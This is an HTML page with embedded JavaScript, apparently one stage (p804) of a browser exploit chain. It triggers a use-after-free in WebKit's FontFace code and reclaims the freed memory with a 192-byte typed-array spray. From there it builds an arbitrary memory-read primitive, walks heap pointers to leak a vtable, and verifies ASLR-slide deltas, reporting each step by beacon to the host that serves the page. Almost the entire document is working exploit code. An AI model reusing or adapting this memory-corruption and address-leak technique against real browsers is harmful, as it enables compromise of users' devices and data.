<!--
  p804: vtable slot verification + prologue read attempt (Arm 1 + delta invariance)

  Tests from PR #240 review (cobrajet302gt):
  - Arm 1: read 16 bytes at s2 and s4 addresses to check if byte-identical
    (fork-drift/ICF) or different (mislabel). Note: s2/s4 are in .text (XO),
    so the read will crash — XO status itself is the result.
  - Delta invariance: all 6 VP-slot deltas must reproduce under new ASLR slide.
    Expected values (cobrajet302gt canonical table, PR #240):
      s0: 0x1710B78, s1: 0x1710B48, s2: 0x324C3D8
      s3: 0x1710478, s6: 0x1ABA728, s7: 0x1710318

  Mechanism: UAF trigger + 192B spray → walk chain to VP → vtable read → verify.
  Does NOT need self-scan or walk-forge — stops after W4.

  CRASH_CLASS: HIGH
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p804 vtable-verify</title></head>
<body>
<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
<pre id="out">p804</pre>
<script>
'use strict';
var O=document.getElementById('out');
var UID=Math.random().toString(36).slice(2,8).toUpperCase();

function b(m){try{O.textContent+='\n'+m;}catch(e){}
  try{var u=location.protocol+'//'+location.host+'/beacon/P804-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID;if(navigator.sendBeacon&&navigator.sendBeacon(u))return;}catch(e){}
  try{new Image().src=location.protocol+'//'+location.host+'/beacon/P804-'+encodeURIComponent(m)+'?t='+Date.now();}catch(e){}}
function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P804-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}

/* --- params --- */
function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
var K=qint('k',32), PW=qint('pw',80), SI=qint('si',0);
var SIZE=192, fired=false, faces=null;

/* --- primitives --- */
function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
function hex(x){return '0x'+x.toString(16);}

/* Expected deltas (cobrajet302gt canonical table, PR #240) */
var EXPECT={
  s0:0x1710B78n, s1:0x1710B48n, s2:0x324C3D8n,
  s3:0x1710478n, s6:0x1ABA728n, s7:0x1710318n
};

/* Load counter: first load of a fresh WebProcess gets the UAF.
   Subsequent loads after crash are wasted — WebProcess memory is degraded.
   p691 learned this: load 1 survives, load 2+ dies. */
var loadNo=1;
try{loadNo=parseInt(localStorage.getItem('p804_load')||'0',10)+1;localStorage.setItem('p804_load',String(loadNo));}catch(e){}
b('VER-1');b('BOOT-'+UID+',load='+loadNo);

if(loadNo>2){
  /* Too many crashes — stop and wait for manual reload or fresh WebProcess */
  b('LOADLIMIT-'+loadNo);
  verd('bad','Load '+loadNo+' — kill WebProcess (navigate away + back) to get a fresh one');
  try{localStorage.setItem('p804_load','0');}catch(e){}
}
else{setTimeout(start,200);}

/* --- UAF trigger (same as p691, K=32) --- */
function start(){
  try{
  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
  try{document.fonts.add(vf);}catch(e){}
  try{void vf.loaded;}catch(e){}
  var fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);

  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(fired)return undefined;fired=true;
    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
    try{document.body.offsetHeight;}catch(e){}
    window.__sp=[];
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SIZE));
      w[0x82]=3;
      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});

  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
                                               function(e){b('RJ-'+String(e&&e.name));});
  setTimeout(function(){if(!faces)b('NOFACES');},1500);
  }catch(e){b('START-ERR-'+e.message);}
}

/* --- main walk chain --- */
function phase(){
  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null;

  /* Step 1: hit detection */
  for(var i=0;i<window.__sp.length;i++){
    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);bufl1.push(a);if(!rawL)rawL=[a,c];}
  }
  if(rawL){L1=rawL[0];L2=rawL[1];}
  b('L1-'+hex(L1));b('L2-'+hex(L2));
  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK — reloading');return;}

  /* Step 2: forge safe state */
  for(var ib=0;ib<bufs.length;ib++){var vb=bufs[ib][0];vb[0]=2;put64(vb,0x08,bufs[ib][1]);vb[0x10]=0;vb[0x82]=0;}
  b('FORGED-'+bufs.length);

  setTimeout(function(){
    /* Step 3: re-add faces, find oracle face */
    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
    for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
    b('ADDED');

    setTimeout(function(){
      var fam=null,zi=-1;
      for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;break;}}
      if(!fam){b('NOTIN');verd('bad','NOTIN — reloading');return;}

      for(var is=0;is<bufs.length;is++){bufs[is][0][0x28]=1;bufs[is][0][0x2C]=1;}

      function setR(t){for(var ir=0;ir<bufs.length;ir++){put64(bufs[ir][0],0x20,t);}}
      function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}

      /* --- Self-scan: simplified via +0x38 marker oracle --- */
      var self=0n,selfFound=false,SKIPJ=-1;

      /* Look for self via +0x38 marker match in spray buffers */
      for(var ip=0;ip<bufs.length;ip++){var vp=bufs[ip][0];
        vp[0x38]=0x00;vp[0x39]=0x10;vp[0x3A]=0x00;vp[0x3B]=0x00;
        vp[0x3C]=0x00;vp[0x3D]=0x20;vp[0x3E]=0x00;vp[0x3F]=0x00;}

      /* Try deriving self from L2 back-pointer pattern */
      var b2Ref=Number((L2>>16n)&0xFFn);
      var b4Ref=Number((L2>>32n)&0xFFn);

      /* Quick scan: check if boundary oracle works to find self */
      function boundary(tgt){
        setR(tgt);
        if(chk(0)!==true)return -1;
        var lo=0,hi=0x10FFFF,res=-1;
        while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===true){res=mid;lo=mid+1;}else hi=mid-1;}
        return res;
      }

      /* First try: if L2 has a good pattern, derive self from client pointer */
      setR(L2+0x07n);
      var t1=-1;
      if(chk(0)===true)t1=boundary(L2+0x07n);

      if(t1>=0){
        /* Oracle alive — try to find client and derive self */
        b('ORACLE-ALIVE-t1=0x'+t1.toString(16));

        /* Simplified: scan a small window for self via +0x38 marker */
        var B4s=[b4Ref,0x10];
        var b2s=[b2Ref];for(var q5=0;q5<16;q5++){var v5=b2Ref+q5;if(v5<256&&v5!==b2Ref)b2s.push(v5);v5=b2Ref-q5;if(v5>=0&&v5!==b2Ref)b2s.push(v5);}

        for(var i8=0;i8<B4s.length&&!selfFound;i8++){
          for(var i7=0;i7<b2s.length&&!selfFound;i7++){
            for(var q7=0;q7<0x20&&!selfFound;q7++){
              for(var i6=0;i6<16&&!selfFound;i6++){
                var sc=BigInt(i6*16)|(BigInt(q7)<<8n)|(BigInt(b2s[i7])<<16n)|(BigInt(B4s[i8])<<32n);
                setR(sc+0x38n);
                if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
                  self=sc;selfFound=true;
                }
              }
            }
          }
        }
      } else {
        b('ORACLE-DEAD');
      }

      if(!selfFound){b('NOSELF');verd('bad','NOSELF — reloading');return;}
      bs('SELF-'+hex(self));

      /* Find VTAB (adjacent buffer for forgeRead target) */
      for(var sv=1;sv<=256;sv++){
        var cd=self-BigInt(sv*64);
        setR(cd);
        if(chk(0x1000)===true&&chk(0x1001)===false){
          var jj=Number(boundary(cd))-0x1000;
          if(jj>=0&&jj<K){SKIPJ=jj;bs('VTAB-j'+jj);break;}
        }
      }

      /* --- forgeRead + readStyle mechanism --- */
      function forgeRead(daddr,dlen){
        for(var ib2=0;ib2<window.__sp.length;ib2++){
          var vb2=window.__sp[ib2];if(!vb2)continue;
          if(SKIPJ>=0&&ib2===SKIPJ)continue;
          if(selfFound){put64(vb2,0x08,self+0x70n);vb2[0x10]=0;}
          put32(vb2,0x30,4);put32(vb2,0x34,dlen);put64(vb2,0x38,daddr);put32(vb2,0x40,4);
          vb2[0x44]=0x7A;vb2[0x45]=0x7A;vb2[0x46]=0x71;
          put32(vb2,0x70,4);
          put32(vb2,0x74,0x10);vb2[0x78]=14;vb2[0x79]=0;
          if(selfFound)put64(vb2,0x7A,self+0x90n);
          put32(vb2,0x90,3);put32(vb2,0x94,72);
          if(selfFound)put64(vb2,0x98,self+0x30n);
        }
      }
      function dec(s,lim){
        var by=[],q2=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q2;
        while(k<e&&by.length<lim){var ch=s.charAt(k);
          if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
            if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
            else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
          else{by.push(s.charCodeAt(k));k++;}}
        var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
      }
      function readLeHex(hexStr,off){
        var s=hexStr.slice(off*2,off*2+16);
        if(!/^[0-9a-f]{16}$/.test(s))return 0n;
        return BigInt('0x'+s.match(/../g).reverse().join(''));
      }

      /* Remove face from document.fonts BEFORE forgeRead */
      bs('DEL-PRE');
      try{document.fonts.delete(faces[zi]);}catch(e){bs('DEL-ERR');}

      /* Snapshot safe state */
      var snap=new Uint8Array(SIZE);
      if(bufs.length>0)for(var ps=0;ps<SIZE;ps++)snap[ps]=bufs[0][0][ps];

      function restoreAndForge(daddr,dlen){
        for(var ib3=0;ib3<window.__sp.length;ib3++){
          var vb3=window.__sp[ib3];if(!vb3)continue;
          if(SKIPJ>=0&&ib3===SKIPJ)continue;
          for(var dd=0;dd<SIZE;dd++)vb3[dd]=snap[dd];
        }
        forgeRead(daddr,dlen);
      }

      /* ====== WALK CHAIN (synchronous, same as p691) ====== */
      /* W1: read hash table */
      forgeRead(L1-0x10n,80);
      var hw='';
      try{hw=dec(String(faces[zi].style),128);}catch(e){bs('IHT-err');}
      for(var pr=0;pr<window.__sp.length;pr++){var prv=window.__sp[pr];if(!prv)continue;if(SKIPJ>=0&&pr===SKIPJ)continue;for(var pr2=0;pr2<SIZE;pr2++)prv[pr2]=snap[pr2];}

      var IM=0n,FO=0n,VP=0n;
      var S0=0n,S1=0n,S2=0n,S3=0n,S4=0n,S5=0n,S6=0n,S7=0n,S8=0n;
      var walkOK=false,h4='';

      if(hw.length>=160){
        bs('IHT-ok-'+hw.length);
        /* Parse hash table for client WeakPtrImpl */
        for(var gb=2;gb<10;gb++){
          var hb=hw.slice(gb*16,gb*16+16);
          if(/^[0-9a-f]{16}$/.test(hb)){
            var cv=BigInt('0x'+hb.match(/../g).reverse().join(''));
            if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn){IM=cv;break;}
          }
        }

        if(IM!==0n){
          /* W2: IM+8 → FO (CSSFontFaceSet*) */
          restoreAndForge(IM+8n,16);
          var h2=dec(String(faces[zi].style),128);
          for(var r2=0;r2<window.__sp.length;r2++){var r2v=window.__sp[r2];if(!r2v)continue;if(SKIPJ>=0&&r2===SKIPJ)continue;for(var r2b=0;r2b<SIZE;r2b++)r2v[r2b]=snap[r2b];}
          var hf=h2.slice(0,16);
          if(/^[0-9a-f]{16}$/.test(hf))FO=BigInt('0x'+hf.match(/../g).reverse().join(''));

          if(FO>0x1000000000n){
            /* W3: FO → VP (vtable pointer) */
            restoreAndForge(FO,32);
            var h3=dec(String(faces[zi].style),128);
            for(var r3=0;r3<window.__sp.length;r3++){var r3v=window.__sp[r3];if(!r3v)continue;if(SKIPJ>=0&&r3===SKIPJ)continue;for(var r3b=0;r3b<SIZE;r3b++)r3v[r3b]=snap[r3b];}
            var hv=h3.slice(0,16);
            if(/^[0-9a-f]{16}$/.test(hv))VP=BigInt('0x'+hv.match(/../g).reverse().join(''));

            if(VP>0x100000000n){
              /* Yield + sync beacon */
              bs('W3-VP='+hex(VP));

              /* W4: read 72 bytes of vtable */
              restoreAndForge(VP,72);
              var raw4='';
              try{raw4=String(faces[zi].style);}catch(e){raw4='';}
              h4=dec(raw4,128);
              for(var r4=0;r4<window.__sp.length;r4++){var r4v=window.__sp[r4];if(!r4v)continue;if(SKIPJ>=0&&r4===SKIPJ)continue;for(var r4b=0;r4b<SIZE;r4b++)r4v[r4b]=snap[r4b];}

              if(h4.length>=128){
                S0=readLeHex(h4,0);S1=readLeHex(h4,8);S2=readLeHex(h4,16);
                S3=readLeHex(h4,24);S4=readLeHex(h4,32);S5=readLeHex(h4,40);
                S6=readLeHex(h4,48);S7=readLeHex(h4,56);S8=readLeHex(h4,64);
                walkOK=true;
              }
            }
          }
        }
      } else {
        bs('IHT-short-'+hw.length);
      }

      /* Restore safe state */
      for(var rr=0;rr<window.__sp.length;rr++){
        var rrv=window.__sp[rr];if(!rrv)continue;
        if(SKIPJ>=0&&rr===SKIPJ)continue;
        for(var rr2=0;rr2<SIZE;rr2++)rrv[rr2]=snap[rr2];
      }

      /* ====== RESULTS ====== */
      bs('WALK-IM='+hex(IM)+',FO='+hex(FO)+',VP='+hex(VP));
      bs('WALK-ok='+walkOK);

      if(!walkOK){
        bs('WALK-FAIL');
        verd('bad','WALK FAIL — reloading');
        return;
      }

      bs('VT-s0='+hex(S0)+',s1='+hex(S1)+',s2='+hex(S2));
      bs('VT-s3='+hex(S3)+',s4='+hex(S4)+',s5='+hex(S5));
      bs('VT-s6='+hex(S6)+',s7='+hex(S7)+',s8='+hex(S8));

      /* ====== ARM 1: s2/s4 pointer equality ====== */
      var s2eq4=(S2===S4);
      var s2eq5=(S2===S5);
      var s4eq5=(S4===S5);
      bs('ARM1-s2==s4='+s2eq4+',s2==s5='+s2eq5+',s4==s5='+s4eq5);

      if(s2eq4){
        bs('ARM1-VERDICT=pointer-identical,fork-drift-or-ICF');
      } else {
        bs('ARM1-VERDICT=different-pointers,possible-mislabel-in-p691');
      }

      /* ====== DELTA INVARIANCE ====== */
      var deltas={
        s0:VP-S0, s1:VP-S1, s2:VP-S2,
        s3:VP-S3, s6:VP-S6, s7:VP-S7
      };
      var allMatch=true,results=[];
      var keys=['s0','s1','s2','s3','s6','s7'];
      for(var di=0;di<keys.length;di++){
        var sk=keys[di];
        var got=deltas[sk],exp=EXPECT[sk];
        var match=(got===exp);
        if(!match)allMatch=false;
        results.push(sk+'='+hex(got)+(match?' OK':' MISMATCH(exp='+hex(exp)+')'));
      }
      bs('DELTA-'+results.join(','));
      bs('DELTA-INVARIANT='+allMatch);

      /* ====== ARM 1b: attempt prologue read at s2 (XO test) ====== */
      /* s2 is deep in .text (XO). Reading it will crash WebProcess.
         We do this LAST because it's destructive.
         If we get here, the delta invariance data is already beaconed. */
      bs('ARM1B-ATTEMPT-READ-s2='+hex(S2));
      bs('ARM1B-NOTE=s2-is-'+hex(VP-S2)+'-below-VP,deep-in-.text(XO)');

      /* Try forgeRead at s2 — if XO, this kills WebProcess */
      restoreAndForge(S2,16);
      var s2bytes='';
      try{s2bytes=dec(String(faces[zi].style),32);}catch(e){s2bytes='THROW';}
      /* If we reach this line, s2 is readable (NOT XO) — unexpected */
      bs('ARM1B-s2-READABLE='+s2bytes);

      /* If s2 was readable, also read s4 */
      if(s2bytes&&s2bytes!=='THROW'&&s2bytes.length>0){
        for(var r5=0;r5<window.__sp.length;r5++){var r5v=window.__sp[r5];if(!r5v)continue;if(SKIPJ>=0&&r5===SKIPJ)continue;for(var r5b=0;r5b<SIZE;r5b++)r5v[r5b]=snap[r5b];}
        restoreAndForge(S4,16);
        var s4bytes='';
        try{s4bytes=dec(String(faces[zi].style),32);}catch(e){s4bytes='THROW';}
        bs('ARM1B-s4-READABLE='+s4bytes);
        bs('ARM1B-IDENTICAL='+(s2bytes===s4bytes));
      }

      /* Restore and report */
      for(var rf=0;rf<window.__sp.length;rf++){
        var rfv=window.__sp[rf];if(!rfv)continue;
        if(SKIPJ>=0&&rf===SKIPJ)continue;
        for(var rf2=0;rf2<SIZE;rf2++)rfv[rf2]=snap[rf2];
      }

      /* ====== SUMMARY ====== */
      bs('SUMMARY-VP='+hex(VP)+',pageOff=0x'+(VP&0x3FFFn).toString(16));
      bs('SUMMARY-s2eq4='+s2eq4+',deltaOK='+allMatch);
      verd('ok','VP='+hex(VP)+' deltas='+(allMatch?'MATCH':'MISMATCH')+' s2==s4='+s2eq4);

    },50);
  },50);
}

start();
</script>
</body></html>
